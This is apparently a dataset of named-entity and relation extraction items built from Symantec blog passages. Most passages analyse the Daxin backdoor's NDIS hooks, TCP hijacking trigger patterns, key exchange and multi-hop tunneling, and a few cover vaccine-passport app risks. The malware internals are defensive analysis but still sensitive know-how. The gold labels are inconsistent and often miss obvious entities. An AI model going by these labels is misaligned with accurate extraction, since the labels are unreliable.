{"instruction": "Because the layout of the NDIS_OPEN_BLOCK structure changes between different Windows builds, Daxin needs to determine the correct offsets to use. First it checks NtBuildNumber against a set of hardcoded values for which NDIS_OPEN_BLOCK offsets are explicitly given (Figure 2). Figure 2: Daxin checks NtBuildNumber against a set of hardcoded values for which NDIS_OPEN_BLOCK offsets are explicitly given. The most recent Windows build number hardcoded in Daxin\u2019s codebase is 17763. It corresponds to Windows Server 2019 and Windows 10 version 1809 (Redstone 5). When the Windows build is not recognized, Daxin attempts to use an alternative method to determine the NDIS_OPEN_BLOCK offsets. Daxin then collects details of all NDIS structures to hook, as discussed earlier, along with information about the related network interfaces. Finally, for each network interface, it replaces the original handlers with its own. Figure 3. For each network interface, Daxin replaces the original handlers with its own.", "input": null, "output": "Named Entities: (Daxin, malware)\nRelationships: No related entities and relations."}
{"instruction": "Networking Both the ReceiveNetBufferLists hook and the SendNetBufferListsHandler (or NextSendNetBufferListsHandler ) hook implement logic to inspect the network packets and then hijack some packets before passing the remaining packets to the original handlers. The ProtSendNetBufferListsComplete hook completes any send operation initiated by Daxin, such that NET_BUFFER_LIST structures owned by malware are removed and deallocated before calling the original handler. Before describing the hooks\u2019 implementation in detail, we will first examine a few examples of the observed behavior in Daxin.", "input": null, "output": "Named Entities: (Daxin, malware)\nRelationships: No related entities and relations."}
{"instruction": "In the first scenario, the ReceiveNetBufferLists hook checks the data section of certain TCP packets for predefined patterns. Any matching TCP packets are then removed from the NetBufferLists before calling the original ReceiveNetBufferLists handler. At the same time, for each removed TCP packet, the malicious driver sends two new packets. The first packet is a spoofed RST TCP packet sent to the original destination, so that its recipient marks the TCP connection as closed. The second packet is an ACK TCP packet sent to the original source. From that point, the malicious driver maintains the TCP connection with the original source, relying on the ReceiveNetBufferLists hook to hijack any related network packets. A test demonstrating this scenario is illustrated in Figure 4. Figure 4. The ReceiveNetBufferLists hook checks the data section of certain TCP packets for a predefined \u201cmagic\u201d pattern before hijacking the connection.", "input": null, "output": "No related entities and relations."}
{"instruction": "When generating its network traffic, Daxin uses its own code to forge network packets, bypassing the legitimate Windows TCP/IP stack. To illustrate this, we reconfigured the Windows TCP/IP stack to use non-standard Time to Live (TTL) . Since Daxin does not respect the updated parameter, its traffic stands out in the Wireshark capture shown in Figure 4. The TCP retransmissions in the Wireshark capture are due to our scripts for the kernel debugger that slow down driver response. The retransmissions are not expected otherwise. We decided to activate these scripts to illustrate the internal working of the driver, where we can recognize individual packets from our Wireshark capture, as illustrated in Figure 5. Figure 5. By capturing individual packets, we can illustrate the internal working of Daxin.", "input": null, "output": "Named Entities: (Daxin, malware)\nRelationships: No related entities and relations."}
{"instruction": "In another scenario, Daxin initiates a new TCP connection and maintains it over the whole lifetime of the TCP session. The malware relies on the ReceiveNetBufferLists hook to hijack any network packets related to this connection. The hijacked packets do not reach the legitimate Windows TCP/IP driver. An example TCP connection initiated by the malicious driver will be discussed later in this blog series. In the last scenario, Daxin sends a DNS request using the UDP protocol. The response UDP packet is hijacked by the ReceiveNetBufferLists hook and the DNS response is parsed by the malicious driver. We exercised this functionality in our lab when exploring configuration options related to command-and-control connectivity. The described scenarios indicate that Daxin implements its own TCP/IP stack. This was confirmed with further reverse engineering of the driver, where we identified both data structures and subroutines implementing IPv4, TCP, and UDP.", "input": null, "output": "Named Entities: (Daxin, malware)\nRelationships: No related entities and relations."}
{"instruction": "The main purpose of the NDIS hooks installed by Daxin is to allow for its malicious TCP/IP stack to coexist with the legitimate Windows TCP/IP stack on the same machine. When certain conditions are met, the hooks also allow it to hijack pre-existing TCP connections.", "input": null, "output": "Named Entities: (Daxin, malware)\nRelationships: No related entities and relations."}
{"instruction": "The ReceiveNetBufferLists hook checks the NblFlags member of the NET_BUFFER_LIST structure at the head of its NetBufferLists argument for the NDIS_NBL_FLAGS_IS_LOOPBACK_PACKET flag. Whenever the flag is set, the hook simply passes the network data to the original ReceiveNetBufferLists handler with no other processing. Otherwise, it calls a helper subroutine passing the NetBufferLists linked list of NET_BUFFER_LISTs . The helper subroutine divides the original linked list of NET_BUFFER_LISTs into two chains: one chain of allowed packets for further processing by the legitimate stack and another chain of hijacked packets to drop. The hook then passes the chain of allowed packets to the original ReceiveNetBufferLists handler. Next, if the NDIS_RECEIVE_FLAGS_RESOURCES flag is not set in its ReceiveFlags argument, the hook releases ownership of the chain of hijacked packets using NdisReturnNetBufferLists().", "input": null, "output": "No related entities and relations."}
{"instruction": "The SendNetBufferListsHandler hook checks if the NdisPoolHandle member of the NET_BUFFER_LIST structure, passed as its NetBufferList argument, corresponds to the pool created by Daxin itself to use when sending malicious traffic. If so, the hook simply passes the network data to the original SendNetBufferListsHandler with no other processing. Otherwise, it calls the same helper subroutine as used by the ReceiveNetBufferLists hook to divide its NetBufferList argument into two chains. It then passes the chain of allowed packets to the original SendNetBufferListsHandler . Finally, the chain of hijacked packets is retired using the NdisMSendNetBufferListsComplete() or ProtSendNetBufferListsComplete handler.", "input": null, "output": "Named Entities: (Daxin, malware)\nRelationships: No related entities and relations."}
{"instruction": "The helper subroutine used by both hooks walks the original linked list of NET_BUFFER_LISTs extracting network packets from each visited NET_BUFFER_LIST structure and calling the malicious packet filter for each extracted packet. The verdict returned by the packet filter for the first packet from the visited NET_BUFFER_LIST structure determines if the structure should be allowed for further processing by the legitimate stack or dropped by the hook. The packet filter is central to the networking capabilities of Daxin as it controls dispatching of the extracted packets to various Daxin's sub-modules, where each sub-module implements different functionality. The filter returns an \u201caccept\u201d or \u201cdrop\u201d verdict to indicate if relevant packets should reach the legitimate TCP/IP stack or not. It operates as follows:", "input": null, "output": "No related entities and relations."}
{"instruction": "Checks if the packet is related to any of the network flows from the malicious network tunnel. If so, it captures the packet for forwarding to the remote attacker via an encrypted channel and returns with a \u201cdrop\u201d verdict. Checks if the Ethernet source and destination MAC addresses are equal. If so, it returns with an \u201caccept\u201d verdict. In cases where it was called from the ReceiveNetBufferLists hook, it checks if the Ethernet source MAC address corresponds to any of the network interfaces of the local machine. If so, it returns with an \u201caccept\u201d verdict. In cases of TCP over IPv4 packets, it tracks certain parameters of an active TCP connection for use by TCP hijacking logic in the future (if needed).", "input": null, "output": "No related entities and relations."}
{"instruction": "In cases of non-IPv4 packets or when called from the ReceiveNetBufferLists hook, it calls each handler from the list of Daxin\u2019s packet handlers, stopping on the first handler that claims ownership of the packet. Whenever Daxin\u2019s handler claims ownership on the IPv4 packet, the filter returns with a \u201cdrop\u201d verdict. These Daxin packet handlers are dynamically registered and unregistered by the malicious TCP/IP stack as required, minimizing the overhead. Furthermore, in case of TCP, the list of handlers is bucketed by the server port (which supports TCP servers listening for new connections) or the combination of client and server ports (which supports TCP sessions). The packet is parsed before calling handlers and the parser logic limits the combination of supported protocols to ARP, UDP over IPv4, and TCP over IPv4.", "input": null, "output": "No related entities and relations."}
{"instruction": "In cases of TCP over IPv4 packets when called from the ReceiveNetBufferLists hook, it checks that the TCP data in the packet: Starts with the string \u201cPOST\u201d and contains the string \u201c756981520337\u201d without any line break \u201c\\r\\n\u201d in-between, or Starts with the sequence of bytes 0x10 0x99 0x10 and is at least eight-bytes long, or Starts with the sequence of bytes 0x10 0x99 0x11 and is at least eight-bytes long When a match is found, it triggers hijacking of the related TCP connection and returns with a \u201cdrop\u201d verdict. It should be noted that these checks are not limited to the start of the TCP conversation, and so it is possible to trigger hijacking after exchanging an arbitrary amount of data. This provides the option to start communication with the malicious driver at the end of a long conversation with a legitimate server hosted on the infected computer.", "input": null, "output": "No related entities and relations."}
{"instruction": "Finally, the ProtSendNetBufferListsComplete hook walks the list of NET_BUFFER_LIST structures passed as its second argument checking if the NdisPoolHandle member of the visited NET_BUFFER_LIST structure corresponds to the pool created by the malicious driver itself to use when sending malicious traffic. The matching structures are removed from the list and, after validating the Flags member, deallocated. The hook then passes the modified list to the original ProtSendNetBufferListsComplete handler. A technical paper by Kaspersky on the Slingshot advanced persistent threat (APT) group describes a technique to identify NET_BUFFER_LIST that is very similar to how the ProtSendNetBufferListsComplete hook works, including the use of NdisAllocateNetBufferListPool() and NdisAllocateNetBufferAndNetBufferList(). However, there are no other significant structural overlaps.", "input": null, "output": "Named Entities: (Slingshot, attacker), (advanced persistent threat (APT), threat type), \nRelationships: (Slingshot, belong to, advanced persistent threat (APT))"}
{"instruction": "Key exchange Whenever Daxin hijacks a TCP connection, it checks the received data for a specific message. The expected message initiates a custom key exchange, where two peers follow complementary steps. When discussing this key exchange protocol, we are going to use the term \u201cinitiator\u201d when referring to the side sending the initial message. The opposite side will be called \u201ctarget\u201d. Interestingly, the analyzed sample can implement both the initiator side and the target side of this custom key exchange protocol.", "input": null, "output": "Named Entities: (Daxin, attacker)\nRelationships: No related entities and relations."}
{"instruction": "Firstly, Daxin starts the target-side protocol for each hijacked TCP connection. Additionally, it can be configured to connect to a remote TCP server, where it exchanges a certain handshake and then also starts the target-side protocol. This scenario will be discussed in our next blog in this series in a section titled \u201cExternal communication.\u201d Finally, Daxin can be instructed to connect to a remote TCP server, where it starts the initiator-side protocol. We will expand on this in the next section.", "input": null, "output": "Named Entities: (Daxin, malware)\nRelationships: No related entities and relations."}
{"instruction": "Backdoor capabilities A successful key exchange opens an encrypted communication channel. Daxin uses this communication channel to exchange various messages. Some messages instruct the malware to perform various operations, such as starting an arbitrary process on the affected computer. Others carry results of these operations, such as output generated by the started process, for example. The set of operations recognized by Daxin is rather compact, with the most basic operations being reading and writing arbitrary files. Daxin can also execute arbitrary EXE and DLL binaries. In the case of EXE files, Daxin starts a new user-mode process. The standard input and output of the started process is redirected, so that the remote attacker can interactively send input and receive output. When ordered to execute a DLL file, Daxin performs injection into one of the pre-existing \u201csvchost.exe\u201d processes.", "input": null, "output": "Named Entities: (Daxin, malware), (svchost.exe, file)\nRelationships: (Daxin, inject, svchost.exe)"}
{"instruction": "Daxin provides a dedicated communication mechanism for any additional components deployed by the attacker on the affected computer. Any compatible component can open a \u201c\\\\.\\Tcp4\u201d device created by Daxin to register itself for communication, where it can optionally assign a 32-bit service identifier to distinguish itself from other services that may be active on the same computer. Daxin then forwards any matching communication between the remote attacker and registered services. Next, the remote attacker can inspect and update the backdoor configuration. The configuration is implemented as a generic key-value structure that is stored in an encrypted form in the Windows Registry for persistence. All used configuration items will be listed in the \u201cExternal communication\u201d section in a subsequent blog.", "input": null, "output": "Named Entities: (Daxin, malware)\nRelationships:  No related entities and relations."}
{"instruction": "There are also dedicated messages that encapsulate raw network packets to be transmitted via a local network adapter. Any response packets are then captured by the malicious driver and forwarded to the remote attacker. This allows the remote attacker to establish communications with any servers reachable from the affected machine on the target\u2019s network, creating a network tunnel for the remote attacker to interact with servers of interest. Finally, a special message can be used to set up new connectivity across multiple malicious nodes, where the list of nodes is included in a single command. For each node, the message provides the details required to establish communication, specifically the node IP address, its TCP port number, and the credentials to use during custom key exchange. When Daxin receives this message, it picks the next node from the list.", "input": null, "output": " No related entities and relations."}
{"instruction": "Then it uses its malicious TCP/IP stack to connect to the TCP server listed in the picked entry. Once connected, Daxin starts the initiator-side protocol. On the peer computer, if it is infected with a copy of Daxin, the initiator traffic causes the TCP connection to be hijacked, as explained earlier. This is followed by the custom key exchange to open a new encrypted communication channel. Next, the connecting driver sends an updated copy of the original message over this new channel, where the position of the next node to use is incremented. The process then repeats for the remaining nodes on the list.", "input": null, "output": "Named Entities: (Daxin, malware)\nRelationships: No related entities and relations."}
{"instruction": "The TCP connections created during the above process, along with the connection that received the original connectivity setup instruction are then used for subsequent communications. Whenever an intermediate node receives a message, it may execute the requested operation or forward it along the connectivity path. For certain operations, the node to execute the operation is specified by the position along the path. In some remaining cases, the operation is always forwarded to the last node. Finally, certain operations are always executed by the first node only.", "input": null, "output": " No related entities and relations."}
{"instruction": "This method to create multi-hop connectivity is noteworthy. It is not uncommon for the attackers to jump through multiple hops in victim networks to get around firewalls or to better blend in with usual network traffic. This usually involves multiple steps when using other malware, where each jump requires a separate action. However, in the case of the analyzed sample, the attackers combined these into a single operation. This may indicate that Daxin is optimized for attacks against well-protected networks and cases when the attackers need to periodically reconnect into the compromised network.", "input": null, "output": "Named Entities: (Daxin, malware)\nRelationships: No related entities and relations."}
{"instruction": "The ability to use hijacked TCP connections for backdoor communications is also significant. This may be required when exploiting tightly controlled networks, with strict firewall rules or when the defenders monitor for network anomalies. On the infected machine, any malicious network connections are bypassing the Windows TCP/IP stack, and this could provide some degree of stealth. The attackers invested significant effort in implementing these features with a malicious TCP/IP stack supporting TCP connection hijacking. The implementation of network tunneling, where the malicious driver passes the packets directly between the remote attacker and the target\u2019s network demonstrates how the attackers attempt to minimize their footprint without sacrificing functionality.", "input": null, "output": " No related entities and relations."}
{"instruction": "Backdoor demonstration In order to demonstrate Daxin\u2019s backdoor capabilities, we prepared a lab setup to both illustrate what was described in the previous section and also to collect some examples of malicious network traffic to discuss later. Our lab setup consisted of four separate networks and five machines. Some of the machines had two network interfaces to communicate with different networks, but all packet forwarding functionality was disabled. Each machine ran various network services that were reachable from its neighbors only. Figure 6. Test setup to illustrate Daxin\u2019s backdoor capabilities. In our setup, the attackers can communicate with \u201cAlice-PC\u201d, while all of the other machines are unreachable directly to the attackers. This simulates the network of a hypothetical victim, where machines serving different roles have very restrictive connectivity. \u201cAlice-PC\u201d could represent a DMZ service that is accessible from the internet, but all the other machines are tightly isolated.", "input": null, "output": "Named Entities: (Daxin, malware)\nRelationships: No related entities and relations."}
{"instruction": "We infected all of the configured machines with Daxin, except for just one machine deep in our network that was left clean. Next, based on our understanding of the malicious communications protocol gained during reverse engineering of the malicious driver, we implemented a rough client to interact with the Daxin backdoor running on \u201cAlice-PC\u201d. We used this client to instruct the backdoor on \u201cAlice-PC\u201d to create a communications channel to \u201cDave-PC\u201d passing via two intermediate nodes: \u201cBob-PC\u201d and \u201cCharlie-PC\u201d. The connectivity was established successfully, and we were able to interact with all the infected machines. Finally, we were able to use this malicious network tunnel via \u201cDave-PC\u201d to communicate with legitimate services on \u201cClean-PC\u201d.", "input": null, "output": "Named Entities: (Daxin, malware)\nRelationships: No related entities and relations."}
{"instruction": "Conclusion \nThis concludes the first part of our technical analysis of Daxin. In our second, and final blog, we will examine the communications and networking features of the malware. \nSymantec Enterprise Blogs You might also enjoy \n9 Min Read", "input": null, "output": "No related entities and relations."}
{"instruction": "Digital Vaccine Passport App Risks: What You Need to Know", "input": null, "output": "No related entities and relations."}
{"instruction": "Two-thirds of the apps analyzed by Symantec exhibited risky behavior. As the world becomes accustomed to living with COVID-19, people are increasingly having to prove they are vaccinated, often via the use of so-called digital vaccine passports containing their identity and vaccination record. Employers, restaurants, even the neighborhood bar are relying on this system to be secure, accurate, and to maintain user privacy. The person using the passport is also expecting the same thing. With a lack of federal guidance or global policy, it has been left up to country, state, or even local municipalities to decide what passes as an \"official\" vaccine passport. Without clear requirements, the private and public sector providers of vaccine passport apps must tackle evaluating a technology and workflow that includes collecting the minimum amount of medical data and personal identifiable information (PII) required to prove vaccination records are legitimate.", "input": null, "output": " No related entities and relations."}
{"instruction": "Symantec, a division of Broadcom Software , took a look at how these digital vaccine passports work and the potential security risks and threat scenarios they present.", "input": null, "output": "No related entities and relations."}
{"instruction": "What is a digital vaccine passport? A vaccine passport is a paper or digital form certifying a person has been vaccinated against a disease, in this case COVID-19. While paper passports may be used, more often the digital form is used, which may, in some cases, be only a screenshot of the results or picture directly taken of the vaccine card (this may work in some cases, although it lacks authenticity that the results are from the provider and have not been tampered with). Digital vaccination passports have QR codes that contain and connect a user\u2019s encoded health data (a vaccination record from a medical provider) to the vaccinated person's passport app. Issuers of the encoded vaccination data include healthcare providers and government entities. These entities follow one of two standards concerning the structure of the encoded data.", "input": null, "output": " No related entities and relations."}
{"instruction": "The first standard, followed primarily by issuers in the U.S. and Canada, is the SMART Health Card Framework from VCI, a broad coalition of leading healthcare and technology organizations. The second standard, recognized internationally, is the EU Digital COVID Certificate and uses the Electronic Health Certificate Container Format (HCERT). Both standards use QR codes and are very similar as far as data structure, with one key difference as we will see below. The tools, or validation apps, used to decode the vaccination data in the passport app QR codes are readily available. Using one of these tools, we will take a look at the data contained in one of the QR codes, using an example code from California's digital vaccine record system. Figure 1. Sample QR code from California's digital vaccine record system Note the \"SMART\" logo (Figure 1) identifying it as a SMART Health Card.", "input": null, "output": " No related entities and relations."}
{"instruction": "[+] iss = \"https://myvaccinerecord.cdph.ca.gov/creds\" [+] nbf = 1635982044 ==> TIMESTAMP = 2021-11-03 16:27:24 (UTC) [+] vc = JSON object: [+] type = \"['https://smarthealth.cards#health-card', 'https://smarthealth.cards#immunization', 'https://smarthealth.cards#covid19']\" [+] credentialSubject = {\"fhirVersion\": \"4.0.1\", \"fhirBundle\": {\"resourceType\": \"Bundle\", \"type\": \"collection\", \"entry\": [{\"fullUrl\": \"resource:0\", \"resource\": {\"resourceType\": \"Patient\", \"name\": [{\"family\": \"Doe\", \"given\": [\"John\"]}], \"birthDate\": \"1980-01-01\"}}, {\"fullUrl\": \"resource:1\", \"resource\": {\"resourceType\": \"Immunization\", \"status\": \"completed\", \"vaccineCode\": {\"coding\": [{\"system\": \"http://hl7.org/fhir/sid/cvx\", \"code\": \"208\"}]}, \"patient\": {\"reference\": \"resource:0\"}, \"occurrenceDateTime\": \"2021-03-01\", \"lotNumber\": \"EN6208\"}}, {\"fullUrl\": \"resource:2\", \"resource\": {\"resourceType\": \"Immunization\", \"status\": \"completed\", \"vaccineCode\": {\"coding\": [{\"system\": \"http://hl7.org/fhir/sid/cvx\", \"code\": \"208\"}]}, \"patient\": {\"reference\": \"resource:0\"}, \"occurrenceDateTime\": \"2021-04-01\", \"lotNumber\": \"ER8737\"}}]}}}} Token signature: YCeST7-YDMawwowswFx1R_TYg_5mDVsrSXqNLckdqCY5eNriEoUaSBSu7sCF8T", "input": null, "output": "Named Entities: (https://myvaccinerecord.cdph.ca.gov/creds, URL), (https://smarthealth.cards#health-card, URL), (https://smarthealth.cards#immunization, URL), (https://smarthealth.cards#covid19, URL)\nRelationships: No related entities and relations."}
{"instruction": "It is important to note that anyone with the QR code can decode this information, as it is not encrypted. The same data can be used to copy and generate the same QR code. The signature, on the other hand, can be used to verify that the passport has not been changed or tampered with and that it came from the issuer, in this case the State of California. By providing the signature and sharing the public key, anyone can verify the vaccine passport has not been tampered with and is from the issuer.", "input": null, "output": " No related entities and relations."}
{"instruction": "Internationally, QR code vaccination records use the Electronic Health Certificate Container Format (HCERT). Similar to the SMART Health Card, the QR image contains a header, payload, and signature. The payload contains mostly the same vaccination record data - name, date of birth, vaccination record, and dates. The signature is also used to validate the authenticity of the digital vaccination record. However, the difference is in the header. SMART Health Cards contain a link/URL to the issuer in the header, which contains the public key used to validate the authenticity of the record using the signature. HCERT QR codes only contain the name of the issuer in the header, and it is up to the verifier app to find and store the public key from the issuer.", "input": null, "output": " No related entities and relations."}
{"instruction": "App risks What are the actual data privacy risks associated with digital vaccine passports? At a minimum, the personal data they contain includes the person's name, date of birth, and vaccine status. This data may be considered medical data and, if exposed, poses a risk if obtained by scammers, who may use it for targeted phishing attacks. Another, and arguably greater and potentially graver risk, is the validity and accuracy of the vaccine passport. Similar to traditional passports, counterfeiting or tampering with the results may in some jurisdictions result in criminal penalties. Therefore, the technology to identify digital vaccine passports must securely and accurately identify their validity and ensure the results have not been tampered with. Otherwise, people may be exposed to the virus and this could come with deadly consequences.", "input": null, "output": " No related entities and relations."}
{"instruction": "We analyzed 40 digital vaccine passport apps and 10 validation apps. The apps we examined were from government entities and regional health providers in multiple countries around the world.", "input": null, "output": "No related entities and relations."}
{"instruction": "Digital passport wallet apps Digital vaccine passports are commonly stored on a person's mobile device inside a digital wallet. This provides the convenience of being able to quickly and easily open and show vaccination records when requested. If done right, the person can be confident the data is accurate and secure. Not done right, and the vaccination record can potentially be read by an attacker, either via a network attack or a malicious app on the user\u2019s mobile device.", "input": null, "output": "No related entities and relations."}
{"instruction": "Note that our app analysis focused on publicly available mobile apps used to store vaccination records. Apple and Google also provide storage and retrieval for vaccine passports - Apple via the Health App and Google via Google Wallet - and while our findings for these solutions didn't raise any security flags, it is important to note that both rely on app sandbox protection and sharing permissions to protect vaccination records. This means that if the mobile device is compromised by an attacker, or if the user is tricked into sharing the health data, all bets are off.", "input": null, "output": " No related entities and relations."}
{"instruction": "Digital passport wallet apps: threat scenarios Wallets that store data in the cloud may expose the user\u2019s vaccination records by including hardcoded cloud credentials inside the app. During our analysis we also found wallets containing hardcoded cloud credentials, potentially exposing sensitive users\u2019 data. Vaccine records may also be exposed if the digital wallet app transfers data from the cloud unencrypted or insecurely. In addition, vaccine records may be exposed if the user unknowingly shares the health data to other apps on their device, or if the vaccine records are stored insecurely on the device. Knowing these threat scenarios, we analyzed the apps looking for risky behaviors that include: Accesses external storage Disables SSL certificate authority (CA) validation Does not require HTTPS Sends data unencrypted Uses hardcoded cloud credentials Out of the 40 digital passport wallet apps analyzed, 27 exhibited at least one of these risky behaviors.", "input": null, "output": " No related entities and relations."}
{"instruction": "Figure 2. Risky behavior performed by digital passport wallet apps Threat App count App percentage Accesses External Storage 17 43% Disables SSL CA Validation 2 5% Does Not Require HTTPS 15 38% Sends Data Unencrypted 2 5% Uses Amazon Hardcoded Credentials 1 3% Grand Total 27 68%", "input": null, "output": "No related entities and relations."}
{"instruction": "Digital passport validation apps: threat scenarios To verify that a vaccine passport is legitimate, validation apps exist that decode the data in the QR code and flag if the vaccination record has been tampered with. As we saw when decoding the example QR code, a signature is contained inside the record that can be used to verify that the record is from the issuer and has not been tampered with. How do we know the QR code is from a specific health provider or issuer? Also inside the QR code is the link to the public key used to sign the record, which is then used to validate the signature.", "input": null, "output": " No related entities and relations."}
{"instruction": "Anyone can create a QR code and put in their own issuer links, therefore a validation app must show and/or whitelist only approved issuers. Otherwise, anyone could use a fake state or medical named issuer URL with fake vaccination record data and the validation app would blindly pass the person. This type of flaw was found in the Quebec Vaxicode Verif app in late 2021 . When transferring the public key from the issuer or health provider, the URL must be securely accessed and transferred to the mobile device running the app. If the validation app insecurely accesses the URL, an attacker may change the public key and \"pass\" their fake vaccination record. Or, even more deviously, change it to selectively fail other vaccination records.", "input": null, "output": " No related entities and relations."}
{"instruction": "Often validation apps also store the digital vaccine records, either locally or in the cloud. If that is the case, which ideally it shouldn't be, the validation apps are subject to the same risks and threat scenarios as digital wallet apps. Knowing this, we looked for the same previously listed risky behaviors in seven validation apps available at the time of this report and found all of them to be safe. That being said, we will continue to scan new versions of those apps, as well as new validation apps, as they appear on our customers' mobile devices.", "input": null, "output": "No related entities and relations."}
{"instruction": "Conclusion \nThis is yet another reminder to always be vigilant of apps claiming to protect your privacy and identity, including digital passport wallets. Only give apps permission to private data that they require, nothing more. Whenever possible, avoid third-party apps claiming to securely store your vaccination records and instead use digital wallet solutions provided by the major mobile platforms, such as the Apple Health app and Google Wallet. \nApp developers should only collect and access the user data required to provide the service to the user. Developers should also understand and implement best security practices that protect the users\u2019 private data in the cloud, in transit, and on device. Anything less may compromise your users\u2019 privacy, expose personal medical data, and potentially undermine the legitimacy of their vaccination records entirely. \nSymantec Enterprise Blogs You might also enjoy \n7 Min Read", "input": null, "output": "No related entities and relations."}
{"instruction": "Security and Privacy of COVID-19 Contact-Tracing Apps Symantec analyzed the top 25 COVID-19 national contact-tracing apps to see which follow security and privacy best practices.", "input": null, "output": " No related entities and relations."}
{"instruction": "Daxin: Stealthy Backdoor Designed for Attacks Against Hardened Networks", "input": null, "output": "Named Entities: (Daxin, malware), (Backdoor, threat type)\nRelationships: (Daxin, belong to, Backdoor)"}
{"instruction": "Espionage tool is the most advanced piece of malware Symantec researchers have seen from China-linked actors. New research by the Symantec Threat Hunter team, part of Broadcom Software, has uncovered a highly sophisticated piece of malware being used by China-linked threat actors, exhibiting technical complexity previously unseen by such actors. The malware appears to be used in a long-running espionage campaign against select governments and other critical infrastructure targets. There is strong evidence to suggest the malware, Backdoor.Daxin, which allows the attacker to perform various communications and data-gathering operations on the infected computer, has been used as recently as November 2021 by attackers linked to China. Most of the targets appear to be organizations and governments of strategic interest to China. In addition, other tools associated with Chinese espionage actors were found on some of the same computers where Daxin was deployed.", "input": null, "output": "Named Entities: (Espionage tool, tool), (China-linked actors, attacker), (Backdoor.Daxin, malware)\nRelationships: (Espionage tool, seen from, China-linked actors), (Backdoor.Daxin, used by, China-linked actors)"}
{"instruction": "Daxin is without doubt the most advanced piece of malware Symantec researchers have seen used by a China-linked actor. Considering its capabilities and the nature of its deployed attacks, Daxin appears to be optimized for use against hardened targets, allowing the attackers to burrow deep into a target\u2019s network and exfiltrate data without raising suspicions. Through Broadcom\u2019s membership in the Joint Cyber Defense Collaborative (JCDC), Symantec researchers worked with the Cyber Security and Infrastructure Security Agency (CISA) to engage with multiple foreign governments targeted with Daxin and assisted in detection and remediation. This is the first in a series of blogs. This blog provides an overview of Daxin\u2019s capabilities and will be followed with additional blogs providing further in-depth analysis.", "input": null, "output": "Named Entities: (Daxin, malware), (China-linked actor, attacker)\nRelationships: (Daxin, used by, China-linked actor)"}
{"instruction": "Daxin technical overview As described in more detail below, Daxin comes in the form of a Windows kernel driver, a relatively rare format for malware nowadays. It implements advanced communications functionality, which both provides a high degree of stealth and permits the attackers to communicate with infected computers on highly secured networks, where direct internet connectivity is not available. These features are reminiscent of Regin, an advanced espionage tool discovered by Symantec in 2014 that others have linked to Western intelligence services. Daxin\u2019s capabilities suggest the attackers invested significant effort into developing communication techniques that can blend in unseen with normal network traffic on the target\u2019s network. Specifically, the malware avoids starting its own network services. Instead, it can abuse any legitimate services already running on the infected computers.", "input": null, "output": "Named Entities: (Daxin, malware), (Regin, malware)\nRelationships: (Daxin, reminiscent of, Regin)"}
{"instruction": "Daxin is also capable of relaying its communications across a network of infected computers within the attacked organization. The attackers can select an arbitrary path across infected computers and send a single command that instructs these computers to establish requested connectivity. This use case has been optimized by Daxin\u2019s designers. Daxin also features network tunneling, allowing attackers to communicate with legitimate services on the victim\u2019s network that can be reached from any infected computer.", "input": null, "output": "Named Entities: (Daxin, malware)\nRelationships: No related entities and relations."}
{"instruction": "Daxin in detail Daxin is a backdoor that allows the attacker to perform various operations on the infected computer such as reading and writing arbitrary files. The attacker can also start arbitrary processes and interact with them. While the set of operations recognized by Daxin is quite narrow, its real value to attackers lies in its stealth and communications capabilities.", "input": null, "output": "Named Entities: (Daxin, malware)\nRelationships: No related entities and relations."}
{"instruction": "Daxin is capable of communicating by hijacking legitimate TCP/IP connections. In order to do so, it monitors all incoming TCP traffic for certain patterns. Whenever any of these patterns are detected, Daxin disconnects the legitimate recipient and takes over the connection. It then performs a custom key exchange with the remote peer, where two sides follow complementary steps. The malware can be both the initiator and the target of a key exchange. A successful key exchange opens an encrypted communication channel for receiving commands and sending responses. Daxin\u2019s use of hijacked TCP connections affords a high degree of stealth to its communications and helps to establish connectivity on networks with strict firewall rules. It may also lower the risk of discovery by SOC analysts monitoring for network anomalies.", "input": null, "output": "Named Entities: (Daxin, malware)\nRelationships: No related entities and relations."}
{"instruction": "Daxin\u2019s built-in functionality can be augmented by deploying additional components on the infected computer. Daxin provides a dedicated communication mechanism for such components by implementing a device named \u201c\\\\.\\Tcp4\u201d. The malicious components can open this device to register themselves for communication. Each of the components can associate a 32-bit service identifier with the opened \\\\.\\Tcp4 handle. The remote attacker is then able to communicate with selected components by specifying a matching service identified when sending messages of a certain type. The driver also includes a mechanism to send back any responses.", "input": null, "output": "Named Entities: (Daxin, malware)\nRelationships: No related entities and relations."}
{"instruction": "There are also dedicated messages that encapsulate raw network packets to be transmitted via the local network adapter. Daxin then tracks network flows, such that any response packets are captured and forwarded to the remote attacker. This allows the attacker to establish communication with legitimate services that are reachable from the infected machine on the target\u2019s network, where the remote attacker uses network tunnels to interact with internal servers of interest. Figure 1. Daxin can create stealthy communications channels in order to interact with computers on highly secured networks. Perhaps the most interesting functionality is the ability to create a new communications channel across multiple infected computers, where the list of nodes is provided by the attacker in a single command.", "input": null, "output": "Named Entities: (Daxin, malware)\nRelationships: No related entities and relations."}
{"instruction": "For each node, the message includes all the details required to establish communication, specifically the node IP address, its TCP port number, and the credentials to use during custom key exchange. When Daxin receives this message, it picks the next node from the list. Then it uses its own TCP/IP stack to connect to the TCP server listed in the selected entry. Once connected, Daxin starts the initiator side protocol. If the peer computer is infected with Daxin, this results in opening a new encrypted communication channel. An updated copy of the original message is then sent over this new channel, where the position of the next node to use is incremented. The process then repeats for the remaining nodes on the list.", "input": null, "output": "Named Entities: (Daxin, malware)\nRelationships: No related entities and relations."}
{"instruction": "While it is not uncommon for attackers\u2019 communications to make multiple hops across networks in order to get around firewalls and generally avoid raising suspicions, this is usually done step-by-step, such that each hop requires a separate action. However, in the case of Daxin, this process is a single operation, suggesting the malware is designed for attacks on well-guarded networks, where attackers may need to periodically reconnect into compromised computers.", "input": null, "output": "Named Entities: (Daxin, malware)\nRelationships: No related entities and relations."}
{"instruction": "Timeline The Symantec Threat Hunter team has identified Daxin deployments in government organizations as well as entities in the telecommunications, transportation, and manufacturing sectors. Several of these victims were identified with the assistance of the PwC Threat Intelligence team. While the most recent known attacks involving Daxin occurred in November 2021, the earliest known sample of the malware dates from 2013 and included all of the advanced features seen in the most recent variants, with a large part of the codebase having already been fully developed. This suggests that the attackers were already well established by 2013, with Daxin features reflecting their expertise at that time.", "input": null, "output": "Named Entities: (Daxin, malware)\nRelationships: No related entities and relations."}
